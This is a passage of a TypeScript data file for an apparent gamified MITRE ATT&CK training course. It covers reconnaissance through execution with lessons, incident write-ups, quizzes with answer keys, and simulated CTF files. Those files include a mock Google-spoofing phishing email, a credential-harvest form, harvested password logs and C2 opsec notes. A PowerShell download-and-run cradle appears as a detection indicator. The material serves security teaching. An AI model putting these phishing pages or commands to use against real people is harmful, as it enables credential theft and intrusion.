// Attribution: This module references MITRE ATT&CK® content.
// MITRE ATT&CK® is a registered trademark of The MITRE Corporation.
// Content based on the ATT&CK® knowledge base — licensed under CC BY 4.0.
// Source: https://attack.mitre.org/
import type { StageConfig, EpochConfig } from "./types";

export const mitreEpoch: EpochConfig = {
  id: "mitre",
  name: "MITRE ATT&CK",
  subtitle: "Adversary Tactics & Techniques",
  description: "Walk through all 12 ATT&CK tactic phases as the attacker — from reconnaissance to impact. Understand how real APTs operate and how defenders detect each phase using the industry-standard adversary framework.",
  emoji: "⚔️",
  color: "red",
  unlocked: true,
};

export const mitreStages: StageConfig[] = [
  // ─── mitre-01: Reconnaissance ─────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "MITRE Corporation HQ", location: "McLean, Virginia", era: "Present Day", emoji: "🔭" },
    id: "mitre-01",
    order: 1,
    title: "The Intelligence Gathering",
    subtitle: "TA0043 Reconnaissance — mapping the target before first contact",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-01", name: "Recon Specialist", emoji: "🔭" },
    challengeType: "ctf",
    info: {
      tagline: "The attacker who knows the most before touching a system wins before the fight begins.",
      year: 2013,
      overview: [
        "Reconnaissance (TA0043) is ATT&CK's first tactic — weeks or months of intelligence-gathering before a single exploit fires:\n- Employee names and roles come from LinkedIn and company directories.\n- Email formats are recovered from tools like Hunter.io.\n- The technology stack is mapped through job postings, Shodan, and BuiltWith.\n- Exposed infrastructure surfaces via Censys and FOFA, and leaked credentials via HaveIBeenPwned and dark-web forums.",
        "ATT&CK splits recon into two modes that differ sharply in risk:\n- Active scanning (T1595) sends probes at the target's infrastructure — thorough, but capable of tripping IDS alerts.\n- Passive gathering (T1589/T1591/T1592) queries public sources without ever touching the target, leaving it invisible.",
        "Defenders counter recon by shrinking the attack surface:\n- Strip metadata from public documents (T1592.002) so files don't leak names and tooling.\n- Watch for active scanning with honeypots and firewall logs.\n- Use threat-intel feeds to spot adversary infrastructure being stood up against them.",
      ],
      technical: {
        title: "ATT&CK Reconnaissance Sub-Techniques",
        body: [
          "The active and identity-focused sub-techniques are where recon usually starts:\n- T1595 (Active Scanning) — port scans (`nmap`), vulnerability scans (Nessus/OpenVAS), and web crawling, detectable as high-rate connection attempts from a single IP.\n- T1589 (Gather Victim Identity Information) — employee names, emails, and roles pulled from LinkedIn, directories, and breach databases.",
          "The database and elicitation techniques never touch the target:\n- T1596 (Search Open Technical Databases) — Shodan for exposed devices, Censys for TLS certificates and open ports, BuiltWith for the web stack, all served from public indexes.\n- T1598 (Phishing for Information) — targeted emails that coax out credentials or internal documentation before the real attack begins.",
        ],
        codeExample: {
          label: "Passive recon — technology stack fingerprinting (legitimate tools)",
          code: `# Shodan CLI — find target's exposed services (passive, no target contact)
shodan search "hostname:acme.com" --fields ip_str,port,product,version

# theHarvester — email and subdomain enumeration from public sources
theHarvester -d acme.com -b google,bing,linkedin,hunter

# Censys — enumerate TLS certificates for subdomains
curl "https://search.censys.io/api/v2/certificates/search?q=acme.com" \
  -H "Authorization: Bearer $CENSYS_API_KEY"

# Detect metadata in public PDFs (defender task)
exiftool annual-report.pdf | grep -E "Author|Creator|Producer|Company"`,
        },
      },
      incident: {
        title: "APT29 / Cozy Bear — SolarWinds Pre-Attack Recon (2019–2020)",
        when: "2019–December 2020",
        where: "SolarWinds, US Government agencies, Fortune 500 companies",
        impact: "18,000+ organizations compromised; access to NSA, Treasury, State Dept networks; Executive Order 14028 issued",
        body: [
          "Before planting the SUNBURST backdoor in SolarWinds Orion, APT29 (Cozy Bear) spent months mapping the target:\n- They picked Orion precisely because thousands of government and enterprise networks ran it — one supply-chain foothold into all of them.\n- They monitored SolarWinds' GitHub activity, studied the build documentation, and pinpointed the exact build server to compromise — all before a line of malicious code was written.",
          "That patience is the signature of a nation-state actor chaining T1589, T1591, and T1596:\n- The intelligence left detectable signals in Certificate Transparency logs, GitHub, Shodan, and threat-intel feeds.\n- Any organization monitoring public scanning data for its own domains, employee names, and IP ranges could have caught early indicators — but none were watching.",
          "The breach reshaped US federal cybersecurity policy:\n- Executive Order 14028 (May 2021) mandated zero-trust adoption, a software bill of materials (SBOM) for federal procurement, and supply-chain security requirements.\n- CISA, FBI, NSA, and ODNI issued a joint advisory documenting the exact recon techniques (T1589, T1591, T1596) to show defenders what pre-attack passive recon looks like.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT Actor", sub: "passive + active recon", type: "attacker" },
          { label: "Public Sources", sub: "LinkedIn / Shodan / Censys", type: "system" },
          { label: "Target Organization", sub: "SolarWinds", type: "victim" },
          { label: "Attack Intelligence", sub: "employee list / tech stack / infra", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "MITRE ATT&CK framework created — first adversary behavior taxonomy" },
        { year: 2019, event: "APT29 begins SolarWinds reconnaissance — months before first exploit" },
        { year: 2020, event: "SUNBURST backdoor discovered — recon phase enabled supply chain precision", highlight: true },
        { year: 2021, event: "ATT&CK v10 adds Reconnaissance (TA0043) as a formal tactic" },
      ],
      keyTakeaways: [
        "Recon happens before first contact — defenders rarely see it in time",
        "Passive recon (Shodan, Censys, LinkedIn) leaves no trace on target systems",
        "Strip document metadata, limit technology disclosure in job postings",
        "Honeypots and canary tokens detect active scanning early",
      ],
      references: [
        { title: "ATT&CK TA0043 Reconnaissance", url: "https://attack.mitre.org/tactics/TA0043/" },
        { title: "SolarWinds Attack Analysis (CISA)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-01-q1", type: "Tactic", challenge: "ATT&CK phase 1.", text: "What is the goal of the Reconnaissance tactic?", options: ["Gathering information about a target before attacking", "Encrypting the victim's files", "Deleting backups", "Escalating to admin"], correctIndex: 0, explanation: "Reconnaissance (TA0043) is the information-gathering phase that precedes any intrusion." },
        { id: "mitre-01-q2", type: "ATT&CK ID", challenge: "Know the catalog.", text: "Which ATT&CK tactic ID covers Reconnaissance?", options: ["TA0043", "TA0001", "TA0040", "TA0011"], correctIndex: 0, explanation: "Reconnaissance is TA0043 — the first tactic in the ATT&CK matrix." },
        { id: "mitre-01-q3", type: "Passive vs Active", challenge: "Staying invisible.", text: "Why is passive recon (Shodan, Censys, LinkedIn) hard to detect?", options: ["It queries public indexes and never touches the target", "It floods the target with traffic", "It requires admin access", "It only works on weekends"], correctIndex: 0, explanation: "Passive recon leaves no trace on the target because it reads third-party public data." },
        { id: "mitre-01-q4", type: "Tooling", challenge: "OSINT in a box.", text: "Which tool enumerates subdomains and emails from public sources without touching the target?", options: ["theHarvester", "Mimikatz", "Metasploit", "Wireshark"], correctIndex: 0, explanation: "theHarvester aggregates passive OSINT (subdomains, emails) from public indexes." },
        { id: "mitre-01-q5", type: "Real Incident", challenge: "SolarWinds prelude.", text: "During recon before the SolarWinds breach, APT29 focused on…", options: ["SolarWinds' customer list and build pipeline", "Random home users", "Printer firmware", "Social media memes"], correctIndex: 0, explanation: "APT29 spent months mapping the target's customers and build process before striking." },
        { id: "mitre-01-q6", type: "Defense", challenge: "Shrink the footprint.", text: "How does stripping metadata from public documents help defenders?", options: ["It removes author, software, and org details attackers harvest (T1592.002)", "It speeds up downloads", "It encrypts the files", "It blocks phishing"], correctIndex: 0, explanation: "Document metadata leaks internal details; removing it reduces the recon attack surface." },
        { id: "mitre-01-q7", type: "Why It Matters", challenge: "The edge of preparation.", text: "Why is reconnaissance so valuable to an attacker?", options: ["Knowing the most before touching a system gives a decisive advantage", "It immediately steals data", "It patches the target", "It is required by firewalls"], correctIndex: 0, explanation: "Better intelligence up front makes every later stage of the attack more effective." },
        { id: "mitre-01-q8", type: "Spot It", challenge: "Classify the activity.", text: "Which of these is an example of passive reconnaissance?", options: ["Searching LinkedIn for a company's employees", "Port-scanning the company's firewall", "Brute-forcing a login", "Deploying ransomware"], correctIndex: 0, explanation: "Reading public LinkedIn data touches no target system — it's passive recon." },
      ],
    },
    ctf: {
      scenario: "You are an APT analyst studying a reconnaissance operation. The attacker left their recon notes on a compromised jump box. Three files contain intelligence fragments — collect them to reconstruct the attack plan.",
      hint: "Recon notes are in /recon-op. Read each intelligence file.",
      hints: [
        "List /recon-op to find the intelligence files.",
        "passive-intel.txt contains the first fragment.",
        "Read all three files to assemble the flag.",
      ],
      files: {
        "/recon-op/passive-intel.txt": `# Passive Intelligence Gathered
# Target: AcmeCorp — no packets sent to target

Shodan results: 3 exposed services (RDP:3389, SSH:22, HTTPS:443)
LinkedIn: 847 employees, 12 IT staff identified
Email format: firstname.lastname@acme.com (confirmed via Hunter.io)
Tech stack: AWS, Kubernetes, GitHub Enterprise (via job postings)

Fragment-1: FLAG{TA0043_`,
        "/recon-op/active-scan.txt": `# Active Scan Results (nmap -sV)
# WARNING: Active scans may trigger IDS

acme-vpn.acme.com:443  — Cisco AnyConnect 4.9 (outdated, CVE-2021-1445)
acme-mail.acme.com:25  — Postfix 2.11 (outdated)
acme-dev.acme.com:8080 — Jenkins 2.263 (unauthenticated dashboard accessible)

Jenkins access = potential build pipeline entry point

Fragment-2: R3C0N_`,
        "/recon-op/attack-plan.txt": `# Attack Plan — Phase 2: Initial Access

Target: Jenkins on acme-dev.acme.com:8080 (T1195 — supply chain)
Backup: Spear phish IT staff with fake GitHub security alert

Recon complete. Moving to resource development.

Fragment-3: APT29}`,
      },
      dirs: {
        "/": [{ name: "recon-op", isDir: true }],
        "/recon-op": [
          { name: "passive-intel.txt", isDir: false },
          { name: "active-scan.txt", isDir: false },
          { name: "attack-plan.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/recon-op/passive-intel.txt", value: "FLAG{TA0043_", label: "Fragment 1 — Passive Intel" },
        { trigger: "/recon-op/active-scan.txt", value: "R3C0N_", label: "Fragment 2 — Active Scan" },
        { trigger: "/recon-op/attack-plan.txt", value: "APT29}", label: "Fragment 3 — Attack Plan" },
      ],
    },
  },

  // ─── mitre-02: Resource Development ──────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Dark Web Infrastructure", location: "Tor Network, Eastern Europe", era: "Present Day", emoji: "💻" },
    id: "mitre-02",
    order: 2,
    title: "The Arsenal Builder",
    subtitle: "TA0042 Resource Development — staging infrastructure before the attack",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-02", name: "Infrastructure Architect", emoji: "🏗️" },
    challengeType: "ctf",
    info: {
      tagline: "Professional attackers build their weapons before they pick their targets.",
      year: 2020,
      overview: [
        "Resource Development (TA0042) is everything an attacker builds or buys before the attack — and sophisticated groups invest weeks in it:\n- C2 infrastructure, exploit tools, and custom malware.\n- Compromised accounts and code-signing certificates that make later payloads look trusted.",
        "Four techniques cover how that arsenal is sourced:\n- T1583 (Acquire Infrastructure) — VPS servers, domains, and cloud accounts bought with stolen cards or crypto.\n- T1584 (Compromise Infrastructure) — hijacking legitimate websites to relay C2 traffic.\n- T1587 (Develop Capabilities) — building custom malware and zero-days in-house.\n- T1588 (Obtain Capabilities) — purchasing ready-made tools from dark-web forums.",
        "The build-out is detectable before it's ever used:\n- Threat-intel feeds flag typosquatted lookalike domains as they're registered.\n- Certificate Transparency logs expose newly issued certificates for those domains.\n- Passive DNS monitoring catches C2 infrastructure standing up ahead of the attack.",
      ],
      technical: {
        title: "C2 Infrastructure Patterns",
        body: [
          "Modern C2 is layered to survive takedown:\n- Redirectors — cheap VPS servers that forward traffic to the real C2.\n- Domain fronting — routing C2 through CDNs like Cloudflare to hide the destination.\n- Dead-drop resolvers — social-media profiles or Pastebin posts holding the current C2 IP.",
          "Defenders fingerprint that infrastructure from several angles:\n- Domain-age checks — freshly registered domains are inherently suspicious.\n- Passive DNS — tracking IP-to-domain resolutions over time.\n- WHOIS patterns — fully hidden info behind privacy services raises risk.\n- JA3 TLS fingerprinting — C2 frameworks have distinctive TLS handshakes.",
        ],
        codeExample: {
          label: "C2 domain detection — passive DNS and certificate transparency",
          code: `# Check domain age and registration patterns (defender)
whois target-domain.com | grep -E "Creation Date|Registrar|Name Server"

# Certificate Transparency log monitoring — find lookalike domains
# crt.sh API
curl "https://crt.sh/?q=%.acme.com&output=json" | jq '.[].name_value' | sort -u

# Passive DNS — find domains resolving to known C2 IP
curl "https://api.passivetotal.org/v2/dns/passive" \
  -u "$PT_USER:$PT_KEY" \
  -d '{"query": "185.220.101.42"}'

# JA3 TLS fingerprint check against known C2 frameworks
zeek -r capture.pcap -e 'print c$ssl$ja3' | sort | uniq -c`,
        },
      },
      incident: {
        title: "Lazarus Group — Operation AppleJeus Infrastructure (2018)",
        when: "2018–ongoing",
        where: "Global — cryptocurrency exchanges, financial institutions across 30+ countries",
        impact: "$2B+ stolen in cryptocurrency; DPRK nuclear program partially funded by crypto theft; UN Panel of Experts documented $3B in total Lazarus theft 2017–2023",
        body: [
          "North Korea's Lazarus Group (APT38) built a complete fake-business pipeline for Operation AppleJeus:\n- They registered legitimate-looking crypto software companies with real websites and GitHub profiles.\n- They trojanized trading apps (QTBitcoinTrader, Celas Trade Pro) and signed them with code-signing certs bought under the fake identities — so victims ran the malware willingly.",
          "The whole apparatus existed before any victim was approached — attack infrastructure built as a business:\n- The model scaled across 30+ countries and kept evolving through 2023 into DeFi, NFT, and Web3 game targets.\n- UN Panel of Experts reports tie ~$3B in 2017–2023 Lazarus theft — including $625M from the Ronin/Axie bridge (2022) — to funding DPRK's weapons programs.",
          "After AppleJeus, the defensive playbook hardened around the traces this leaves:\n- CISA and US-CERT published certificate thumbprints, domain patterns, and JA3 fingerprints for Lazarus infrastructure.\n- Certificate Transparency monitoring for lookalike-domain certs is now standard — every cert an actor acquires leaves a permanent, searchable record.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Lazarus Group", sub: "nation-state APT (DPRK)", type: "attacker" },
          { label: "Fake Company + Cert", sub: "T1583 + T1588.003", type: "system" },
          { label: "Crypto Exchange Targets", sub: "30+ countries", type: "victim" },
          { label: "$2B Stolen", sub: "cryptocurrency theft", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "Lazarus AppleJeus — fake crypto company + trojanized software" },
        { year: 2020, event: "ATT&CK v7 formalizes Resource Development (TA0042) as a tactic", highlight: true },
        { year: 2021, event: "Domain fronting via major CDNs largely blocked; attackers shift to redirectors" },
        { year: 2023, event: "Lazarus steals $600M from Ronin Bridge — same infrastructure patterns" },
      ],
      keyTakeaways: [
        "Resource development happens before the first victim interaction — detect it with threat intel",
        "Monitor Certificate Transparency logs for lookalike domains targeting your org",
        "Domain age + hidden WHOIS + new cert = high-risk domain pattern",
        "JA3 TLS fingerprinting identifies C2 frameworks by their handshake signature",
      ],
      references: [
        { title: "ATT&CK TA0042 Resource Development", url: "https://attack.mitre.org/tactics/TA0042/" },
        { title: "Operation AppleJeus (Kaspersky)", url: "https://securelist.com/operation-applejeus/87553/" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-02-q1", type: "Tactic", challenge: "Building the arsenal.", text: "What does the Resource Development tactic (TA0042) cover?", options: ["Everything an attacker acquires or builds before the attack — infrastructure, malware, accounts, certs", "Encrypting victim files", "Stealing passwords from memory", "Deleting logs"], correctIndex: 0, explanation: "TA0042 is the pre-attack staging of tools, domains, servers, and capabilities." },
        { id: "mitre-02-q2", type: "Technique", challenge: "Lookalike domains.", text: "Registering lookalike domains and renting VPS servers is which technique?", options: ["T1583 — Acquire Infrastructure", "T1566 — Phishing", "T1003 — Credential Dumping", "T1486 — Data Encrypted for Impact"], correctIndex: 0, explanation: "T1583 covers acquiring the domains, servers, and accounts used to run an operation." },
        { id: "mitre-02-q3", type: "Defense", challenge: "Watching the registries.", text: "How do Certificate Transparency (CT) logs help defenders here?", options: ["They publicly record new TLS certs, so lookalike-domain certs can be spotted early", "They encrypt all web traffic", "They block phishing emails", "They speed up DNS"], correctIndex: 0, explanation: "CT logs are public; monitoring them surfaces suspicious certs for impersonation domains before use." },
        { id: "mitre-02-q4", type: "Real Incident", challenge: "Lazarus, AppleJeus.", text: "In Operation AppleJeus, Lazarus Group built…", options: ["Fake crypto companies and trojanized, code-signed trading software", "A faster antivirus", "A legitimate bank", "A social network"], correctIndex: 0, explanation: "They created convincing fake companies and signed malware to fool victims into installing it (T1587)." },
        { id: "mitre-02-q5", type: "Risk Pattern", challenge: "Reading the signals.", text: "Which combination is a high-risk indicator of attacker infrastructure?", options: ["A newly registered domain + hidden WHOIS + a freshly issued certificate", "An old domain with public WHOIS", "A government domain", "A well-known CDN"], correctIndex: 0, explanation: "New domain + hidden ownership + new cert is a classic staging-infrastructure fingerprint." },
        { id: "mitre-02-q6", type: "Detection", challenge: "Fingerprinting the handshake.", text: "What does JA3 TLS fingerprinting help defenders detect?", options: ["C2 frameworks by their distinctive TLS handshake signature", "Weak passwords", "Open ports", "Email spoofing"], correctIndex: 0, explanation: "Many C2 tools have characteristic TLS handshakes that JA3 can identify." },
        { id: "mitre-02-q7", type: "Timing", challenge: "When it happens.", text: "When does resource development occur?", options: ["Before the attacker ever contacts a victim", "After encryption", "During the ransom negotiation", "Only after detection"], correctIndex: 0, explanation: "It's pre-attack staging — which is why threat intel can catch it early." },
        { id: "mitre-02-q8", type: "Concept", challenge: "Pros prepare.", text: "What does this stage reveal about professional attackers?", options: ["They build their weapons and infrastructure before picking targets", "They improvise everything live", "They never use custom tools", "They only attack at random"], correctIndex: 0, explanation: "Sophisticated actors treat infrastructure-building as a deliberate, up-front phase." },
      ],
    },
    ctf: {
      scenario: "You've seized a threat actor's development server. Their C2 infrastructure notes are split across three files. Collect the fragments to understand their operation.",
      hint: "Infrastructure notes are in /c2-dev. Read each configuration file.",
      hints: [
        "List /c2-dev to find the attacker's notes.",
        "The domain registration notes contain the first fragment.",
        "Read all three files to complete the flag.",
      ],
      files: {
        "/c2-dev/domains.txt": `# Domain Registration Notes
# All registered via Njalla (anonymous) with Monero payment

Primary C2:  secure-update-cdn.com      (registered 2024-10-01, 90-day cert)
Redirector:  cdn-delivery-network.net   (compromised legitimate site)
Fallback:    git-security-patch.org     (domain fronting via Cloudflare)

Fragment-1: FLAG{TA0042_`,
        "/c2-dev/malware-notes.txt": `# Capability Development Notes

BEACON variant: custom Go implant, JA3 fingerprint randomized per build
Signing cert: purchased under "Secure Dev Solutions LLC" (shell company)
Packer: custom LLVM obfuscator, new build per campaign

Fragment-2: R3S_D3V_`,
        "/c2-dev/opsec.txt": `# OpSec Notes

- Never access C2 from home IP — always through Tor exit or rented VPS
- Domains: rotate every 90 days before cert expiry draws attention
- Infrastructure paid via Monero — no fiat trail

Fragment-3: C2}`,
      },
      dirs: {
        "/": [{ name: "c2-dev", isDir: true }],
        "/c2-dev": [
          { name: "domains.txt", isDir: false },
          { name: "malware-notes.txt", isDir: false },
          { name: "opsec.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/c2-dev/domains.txt", value: "FLAG{TA0042_", label: "Fragment 1 — Domains" },
        { trigger: "/c2-dev/malware-notes.txt", value: "R3S_D3V_", label: "Fragment 2 — Malware Notes" },
        { trigger: "/c2-dev/opsec.txt", value: "C2}", label: "Fragment 3 — OpSec" },
      ],
    },
  },

  // ─── mitre-03: Initial Access ─────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "RSA Conference", location: "San Francisco, California", era: "Present Day", emoji: "🎣" },
    id: "mitre-03",
    order: 3,
    title: "The First Foothold",
    subtitle: "TA0001 Initial Access — spear phishing gets the first shell",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-03", name: "Social Engineer", emoji: "🎣" },
    challengeType: "ctf",
    info: {
      tagline: "The most sophisticated exploit is often an email. People are the perimeter.",
      year: 2016,
      overview: [
        "Initial Access (TA0001) is how attackers win their first foothold — and one technique dominates:\n- Spear phishing (T1566) appears in over 90% of nation-state intrusions, per Verizon DBIR data.\n- Decades of security spending haven't displaced it, because it targets people, not systems.",
        "Spear phishing is precision-built from recon so the message looks trusted:\n- T1566.001 — a malicious attachment.\n- T1566.002 — a malicious link.\n- T1566.003 — service phishing through Slack, Teams, or LinkedIn.\n- The payload fires the moment the victim opens or clicks.",
        "Other footholds round out the tactic:\n- T1190 (Exploit Public-Facing Application) — SQL injection or a web shell on an internet-exposed system.\n- T1133 (External Remote Services) — VPN or RDP with stolen credentials.\n- T1195 (Supply Chain Compromise) — the SolarWinds route. All end with the attacker holding execution.",
      ],
      technical: {
        title: "Spear Phishing Detection and Defense",
        body: [
          "Email controls blunt most spear phishing before it lands:\n- DMARC/DKIM/SPF stop domain spoofing.\n- Sandboxing detonates attachments in an isolated VM and watches the behavior.\n- URL rewriting routes links through a proxy that blocks malicious destinations.\n- Anti-phishing AI flags lookalike domains and suspicious sender patterns.",
          "When prevention fails, behavior gives it away:\n- The first process a clicked document spawns — Word launching PowerShell, Excel launching wscript.exe — is a high-fidelity signal.\n- EDR tools like CrowdStrike Falcon catch these parent-child process relationships as exploitation.",
        ],
        codeExample: {
          label: "Spear phish detection — DMARC/DKIM verification",
          code: `# Check DMARC record for a domain (defender)
dig TXT _dmarc.acme.com

# Verify DKIM signature on received email header
# Look for: DKIM-Signature: a=rsa-sha256; d=sender.com; s=selector
# Then verify the selector's public key
dig TXT selector._domainkey.sender.com

# SPF check — did the sending IP match the allowed senders?
# Look in email headers for:
# Received-SPF: pass (google.com: domain of user@acme.com designates 209.85.220.41)

# Suspicious parent-child process (EDR detection rule)
# Alert: WINWORD.EXE spawning powershell.exe
# MITRE T1566.001 + T1059.001`,
        },
      },
      incident: {
        title: "DNC Hack — Spear Phishing Delivers Initial Access (2016)",
        when: "March 2016",
        where: "Democratic National Committee, John Podesta — Washington D.C.",
        impact: "Thousands of emails stolen and published by WikiLeaks; significant US election interference; Mueller investigation; DMARC mandated for .gov domains",
        body: [
          "APT28 (Fancy Bear, GRU Unit 26165) breached the DNC through one spear-phishing email to John Podesta:\n- It spoofed a Google security alert claiming his account was accessed from Ukraine.\n- An aide mistyped 'legitimate' for 'illegitimate'; Podesta entered his credentials on a pixel-perfect Google clone on an APT28 domain registered days earlier.",
          "google.com had no DMARC enforcement to block the spoof at the time:\n- The full operation — recon, domain, phishing page, harvest — cost the attackers about $5.\n- The stolen emails went to WikiLeaks, published strategically during the convention and in October 2016.",
          "A $5 spend producing billions in geopolitical impact reset how email security is prioritized:\n- It triggered the Mueller investigation, dedicated campaign threat briefings, and federally funded election-security programs.\n- The US mandated DMARC p=reject for all .gov domains by 2018, citing phishing as the primary threat.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT28", sub: "Fancy Bear (GRU)", type: "attacker" },
          { label: "Spear Phish Email", sub: "fake Google security alert", type: "system" },
          { label: "John Podesta / DNC", sub: "credential harvested", type: "victim" },
          { label: "Email Archive Stolen", sub: "WikiLeaks publication", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "DNC spear phish — APT28 gains initial access via credential harvest" },
        { year: 2017, event: "Verizon DBIR confirms phishing in 93% of breaches as initial vector", highlight: true },
        { year: 2021, event: "Microsoft 365 Defender adds spear phish sandbox across all mailboxes" },
        { year: 2024, event: "AI-generated spear phishing increases success rates significantly" },
      ],
      keyTakeaways: [
        "Spear phishing drives 90%+ of nation-state initial access — it's the #1 vector",
        "Deploy DMARC/DKIM/SPF + email sandboxing + URL rewriting on all corporate email",
        "EDR parent-child process rules catch post-exploitation before lateral movement",
        "DMARC p=reject + BIMI are the gold standard for anti-spoofing",
      ],
      references: [
        { title: "ATT&CK T1566 Phishing", url: "https://attack.mitre.org/techniques/T1566/" },
        { title: "Podesta Email Hack Timeline (Wired)", url: "https://www.wired.com/2016/12/how-the-2016-election-hack-works/" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-03-q1", type: "Tactic", challenge: "Getting in.", text: "What does the Initial Access tactic (TA0001) achieve?", options: ["The attacker's first foothold inside the target environment", "Encrypting the network", "Stealing kernel memory", "Deleting backups"], correctIndex: 0, explanation: "Initial Access is how the adversary first gains an execution foothold." },
        { id: "mitre-03-q2", type: "Top Vector", challenge: "Still #1.", text: "Roughly how often is spear phishing the initial access vector in nation-state intrusions?", options: ["Over 90% of the time", "Around 5%", "Almost never", "Only for home users"], correctIndex: 0, explanation: "Spear phishing (T1566) remains the dominant initial-access technique by a wide margin." },
        { id: "mitre-03-q3", type: "Real Incident", challenge: "2016, DNC.", text: "What made the 2016 DNC phishing email against John Podesta effective?", options: ["It spoofed a Google security alert and linked to a pixel-perfect login clone", "It exploited a zero-day in Windows", "It brute-forced his password", "It used a malicious USB"], correctIndex: 0, explanation: "APT28 used a convincing fake Google alert; the credentials were harvested on a clone page." },
        { id: "mitre-03-q4", type: "Defense", challenge: "Stop the spoof.", text: "What does DMARC set to p=reject do?", options: ["Causes receiving mail servers to discard spoofed emails from the domain", "Encrypts attachments", "Speeds up email", "Blocks all external email"], correctIndex: 0, explanation: "DMARC p=reject prevents attackers from spoofing the protected domain." },
        { id: "mitre-03-q5", type: "Detection", challenge: "A telltale process tree.", text: "Why is WINWORD.EXE spawning powershell.exe a high-fidelity alert?", options: ["It's a classic sign of a malicious document exploiting the user", "It's normal admin behavior", "Word always launches PowerShell", "It indicates a successful patch"], correctIndex: 0, explanation: "An Office app spawning a script interpreter strongly indicates phish-borne exploitation." },
        { id: "mitre-03-q6", type: "Defense", challenge: "Checking links at click time.", text: "What does URL rewriting / time-of-click protection do?", options: ["Routes email links through a proxy that checks the destination before allowing the visit", "Deletes all links", "Encrypts the email body", "Blocks images"], correctIndex: 0, explanation: "It re-checks the link against threat intel at click time, catching links weaponized after delivery." },
        { id: "mitre-03-q7", type: "Other Vectors", challenge: "Not just email.", text: "Besides phishing, which is an Initial Access technique?", options: ["Exploiting a public-facing application (T1190)", "Encrypting files", "Dumping LSASS", "Deleting shadow copies"], correctIndex: 0, explanation: "Exploiting internet-exposed apps, abusing VPN/RDP, and supply-chain compromise are all initial access paths." },
        { id: "mitre-03-q8", type: "Concept", challenge: "The real perimeter.", text: "Why is 'people are the perimeter' an apt description here?", options: ["A convincing email can bypass technical defenses by tricking a person", "Firewalls don't exist", "Email is always safe", "Users never click links"], correctIndex: 0, explanation: "Spear phishing succeeds by targeting human judgment, often the weakest link." },
      ],
    },
    ctf: {
      scenario: "You are analyzing a spear phishing campaign. The attacker's phishing kit was seized. Three files contain the campaign configuration — collect the fragments to understand the attack chain.",
      hint: "Phishing kit files are in /phish-kit. Read each component file.",
      hints: [
        "List /phish-kit to find the campaign files.",
        "The email template contains the first fragment.",
        "Read the landing page and credential log for the remaining pieces.",
      ],
      files: {
        "/phish-kit/email-template.html": `<!-- Spear Phish Email Template -->
<!-- Target: IT staff at acme.com -->
<h2>Security Alert: Unusual sign-in activity</h2>
<p>We detected a sign-in to your account from Ukraine (IP: 91.108.4.1).</p>
<p>If this wasn't you, <a href="https://accounts-google-secure.com/verify">secure your account now</a>.</p>
<!-- Sender spoofed as: security-noreply@google.com -->
<!-- Fragment-1: FLAG{TA0001_ -->`,
        "/phish-kit/landing-page.html": `<!-- Credential Harvest Landing Page -->
<!-- Hosted on: accounts-google-secure.com (registered 3 days ago) -->
<form method="POST" action="/collect">
  <input type="email" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button>Sign in</button>
</form>
<!-- After submit: redirect to real Google to avoid suspicion -->
<!-- Fragment-2: SPH1SH_ -->`,
        "/phish-kit/creds.log": `# Harvested Credentials
# Campaign start: 2024-11-01

admin@acme.com : P@ssw0rd2024!        [11-01 09:14 UTC]
it-helpdesk@acme.com : Acme2024#     [11-01 09:31 UTC]
cfo@acme.com : Welcome1!              [11-01 11:02 UTC]

# Fragment-3: 1N1T14L}`,
      },
      dirs: {
        "/": [{ name: "phish-kit", isDir: true }],
        "/phish-kit": [
          { name: "email-template.html", isDir: false },
          { name: "landing-page.html", isDir: false },
          { name: "creds.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/phish-kit/email-template.html", value: "FLAG{TA0001_", label: "Fragment 1 — Email Template" },
        { trigger: "/phish-kit/landing-page.html", value: "SPH1SH_", label: "Fragment 2 — Landing Page" },
        { trigger: "/phish-kit/creds.log", value: "1N1T14L}", label: "Fragment 3 — Credential Log" },
      ],
    },
  },

  // ─── mitre-04: Execution ──────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "NSA", location: "Fort Meade, Maryland", era: "Present Day", emoji: "⚡" },
    id: "mitre-04",
    order: 4,
    title: "The Code Runner",
    subtitle: "TA0002 Execution — PowerShell and living-off-the-land scripts",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-04", name: "Execution Engineer", emoji: "⚡" },
    challengeType: "ctf",
    info: {
      tagline: "The best malware uses tools already installed on the victim's machine.",
      year: 2017,
      overview: [
        "Execution (TA0002) is how attackers run their code once they're in — and one interpreter dominates:\n- T1059 (Command and Scripting Interpreter) leads, especially PowerShell (T1059.001).\n- PowerShell ships on every Windows box and is trusted by default, so it rarely looks out of place.",
        "Living-off-the-land (LOLBins) execution abuses signed Microsoft tools to run attacker code:\n- PowerShell, WMI, mshta.exe, regsvr32.exe, certutil.exe, and rundll32.exe are the usual suspects.\n- Because the binaries are Microsoft-signed, they slip past application whitelisting and many AV products.",
        "Detection leans on behavior, not signatures:\n- PowerShell launched with -EncodedCommand is a classic malware tell.\n- So is PowerShell pulling files from the internet (`IEX (New-Object Net.WebClient).DownloadString`).\n- WMI subscription creation and execution-policy-bypass scripts round out the indicators.",
      ],
      technical: {
        title: "PowerShell Execution Detection",
        body: [
          "Three logging settings make PowerShell nearly transparent to defenders:\n- Script Block Logging (Event ID 4104) captures the decoded script even when -EncodedCommand is used.\n- Module Logging (Event ID 4103) records the cmdlets invoked.\n- Transcription writes a full session record.",
